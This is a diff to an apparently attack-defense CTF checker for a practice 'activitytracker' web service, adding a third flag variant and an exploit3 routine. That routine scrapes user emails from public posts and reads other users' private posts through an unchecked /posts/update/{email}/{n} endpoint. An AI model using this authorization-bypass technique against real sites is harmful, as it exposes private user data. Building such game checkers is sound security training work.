@@ -33,10 +33,10 @@ class ActivitytrackerChecker(BaseChecker):
     """
 
     # EDIT YOUR CHECKER PARAMETERS
-    flag_variants = 2
+    flag_variants = 3
     noise_variants = 2
     havoc_variants = 2
-    exploit_variants = 2
+    exploit_variants = 3
     service_name = "activitytracker"
     port = 4242  # The port will automatically be picked up as default by self.connect and self.http.
 
@@ -145,7 +145,7 @@ class ActivitytrackerChecker(BaseChecker):
 
             self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
-                "body": f"I love working here at {company} as a {jobtitle}. My boss {boss_firstname} {boss_lastname} is great, and I'll get a promotion soon! Come work here as well! Cheers, {firstname} {lastname}",
+                "body": f"I love working here at {company} as a {jobtitle}. We even have our own gym! My boss {boss_firstname} {boss_lastname} is great, and I'll get a promotion soon! Come work here as well! Cheers, {firstname} {lastname}",
                 "visibility": "public",
                 "protected": "true"
             })
@@ -237,6 +237,56 @@ class ActivitytrackerChecker(BaseChecker):
                 "username": email,
                 "password": password,
             }
+        elif self.variant_id == 2:
+            # First we need to register a user
+            firstname, lastname = barnum.create_name()
+            company = barnum.create_company_name()
+            jobtitle = barnum.create_job_title()
+            password = barnum.create_pw(length=10)
+
+            boss_firstname, boss_lastname = barnum.create_name()
+            boss_password = barnum.create_pw(length=10)
+
+            email, boss_email = self.generate_matching_emails((firstname.lower(), lastname.lower()),
+                                                              (boss_firstname.lower(), boss_lastname.lower()),
+                                                              company)
+
+            self.register_user(email, password)
+
+            self.http_get('/posts/0')
+
+            self.generate_random_posts(random.randint(0, 3),
+                                       data={"firstname": firstname, "lastname": lastname, "company": company,
+                                             "jobtitle": jobtitle, "password": password,
+                                             "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
+
+            self.http_post('/posts/insert', files={
+                "body": "Private posts are useful to save passwords ^^ Nice ^^",
+                "visibility": "public",
+                "protected": "true"
+            })
+
+            self.http_get('/posts/new')
+            self.http_post('/posts/insert', files={
+                "body": self.flag,
+                "visibility": "private",
+                "protected": "true"
+            })
+
+            self.generate_random_posts(random.randint(0, 3),
+                                       data={"firstname": firstname, "lastname": lastname, "company": company,
+                                             "jobtitle": jobtitle, "password": password,
+                                             "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
+            self.http_get('/posts/0')
+
+            self.http_get('/auth/logout')
+
+
+            # Save the generated values for the associated getflag() call.
+            self.chain_db = {
+                "username": email,
+                "password": password,
+            }
         else:
             raise EnoException("Wrong variant_id provided")
 
@@ -261,7 +311,7 @@ class ActivitytrackerChecker(BaseChecker):
                 if nothing is returned, the service status is considered okay.
                 the preferred way to report errors in the service is by raising an appropriate enoexception
         """
-        if self.variant_id == 0 or self.variant_id == 1:
+        if self.variant_id == 0 or self.variant_id == 1 or self.variant_id == 2:
             # First we check if the previous putflag succeeded!
             try:
                 username: str = self.chain_db["username"]
@@ -525,12 +575,18 @@ class ActivitytrackerChecker(BaseChecker):
             if flag:
                 return flag
             raise BrokenServiceException("Exploit does not work")
+        elif self.variant_id == 2:
+            flag = self.exploit3()
+            if flag:
+                return flag
+            raise BrokenServiceException("Exploit does not work")
         else:
             raise EnoException("Wrong variant_id provided")
 
     pattern1 = re.compile("My boss (\\w+ \\w+) is great. .* Cheers, (\\w+ \\w+)")
     pattern2 = re.compile("by (.*@.*)")
     pattern3 = re.compile("A friend of mine keeps posting their passwords! LOL!")
+    pattern4 = re.compile("Private posts are useful to save passwords")
 
     @staticmethod
     def guess_boss_email(email, name1, name2):
@@ -557,7 +613,7 @@ class ActivitytrackerChecker(BaseChecker):
         password = secrets.token_urlsafe(16)
         self.register_user(email, password)
         page = 0
-        while True:
+        while page < 5:
             resp = self.http_get(f"/posts/{page}")
             t = html.unescape(resp.text)
             if "Activities by" not in t:
@@ -598,7 +654,7 @@ class ActivitytrackerChecker(BaseChecker):
         password_my = secrets.token_urlsafe(16)
         self.register_user(email_my, password_my)
         page = 0
-        while True:
+        while page < 5:
             resp = self.http_get(f"/posts/{page}")
             t = html.unescape(resp.text)
             if "Activities by" not in t:
@@ -643,6 +699,45 @@ class ActivitytrackerChecker(BaseChecker):
                 except Exception as e:
                     pass
 
+    def exploit3(self):
+        # Create new account
+        email = f"{secrets.token_urlsafe(16)}@gmail.com"
+        password = secrets.token_urlsafe(16)
+        self.register_user(email, password)
+        page = 0
+        while page < 5:
+            resp = self.http_get(f"/posts/{page}")
+            t = html.unescape(resp.text)
+            if "Activities by" not in t:
+                break
+            page += 1
+            # Split post list by user
+            user_posts = t.split("Activities")
+            for section in user_posts:
+                # find user's email and all posts matching pattern
+                try:
+                    email = re.search(self.pattern2, section).group(1).strip()
+                    post = re.search(self.pattern4, section)
+                    if not post or not email:
+                        continue
+                    # generate email to attack
+                    n = 0
+                    self.debug(f"attacking {email}")
+                    while True:
+                        n += 1
+                        # get flag by editing post based on known email
+                        resp = self.http_get(f"/posts/update/{email}/{n}")
+                        if resp.status_code != 200:
+                            break
+
+                        t = html.unescape(resp.text)
+                        if "form" not in t:
+                            break
+                        f = self.search_flag(t)
+                        if f:
+                            return f
+                except:
+                    pass
 
 app = ActivitytrackerChecker.service  # This can be used for uswgi.
 if __name__ == "__main__":
